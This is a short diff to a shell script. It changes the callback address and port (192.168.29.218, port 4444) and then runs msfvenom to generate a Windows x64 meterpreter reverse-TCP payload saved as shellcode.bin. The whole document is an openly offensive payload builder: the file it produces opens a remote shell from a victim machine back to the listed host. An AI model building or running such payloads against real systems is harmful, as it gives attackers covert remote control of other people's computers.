@@ -8,6 +8,6 @@
 # echo "Set LPORT : $lport"
 # echo "Create binary payload"
 
-lhost="192.168.29.200"
-lport="8888"
+lhost="192.168.29.218"
+lport="4444"
 msfvenom -platform windows -p windows/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o shellcode.bin
